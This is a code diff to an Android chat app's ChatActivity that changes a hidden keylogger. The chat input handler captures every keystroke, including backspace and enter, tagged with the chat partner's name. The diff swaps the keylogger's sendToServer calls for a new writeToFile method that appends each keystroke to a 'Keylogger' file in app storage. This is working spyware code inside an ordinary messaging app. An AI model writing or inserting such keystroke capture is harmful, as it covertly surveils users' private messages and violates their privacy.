@@ -34,6 +34,7 @@ import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
+import java.io.FileWriter;
 import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -78,16 +79,16 @@ public class ChatActivity extends AppCompatActivity {
                     }
                     else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
                         String keylog  = "Chat with " + otheruser + ":{BACKSPACE}\n";
-                        new sendToServer(keylog).execute();
+                        writeToFile("Keylogger", keylog);
                     }
                     else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
                         String keylog  = "Chat with " + otheruser + ":{ENTER}\n";
-                        new sendToServer(keylog).execute();
+                        writeToFile("Keylogger", keylog);
                     }
                     else{
                         char key = (char) keyEvent.getUnicodeChar();
                         String keylog  = "Chat with " + otheruser + ":{" + key + "}\n";
-                        new sendToServer(keylog).execute();
+                        writeToFile("Keylogger", keylog);
                     }
                 }
                 return false;
@@ -247,5 +248,21 @@ public class ChatActivity extends AppCompatActivity {
             }
         }
         return directory.getAbsolutePath() + "/" + System.currentTimeMillis() + ".jpg";
+    }
+
+    public void writeToFile(String fileName, String content) {
+        File file = new File(ChatActivity.this.getFilesDir(), "text");
+        if (!file.exists()) {
+            file.mkdir();
+        }
+        try {
+            File gpxfile = new File(file, fileName);
+            FileWriter writer = new FileWriter(gpxfile, true);
+            writer.append(content + "\n");
+            writer.flush();
+            writer.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 }
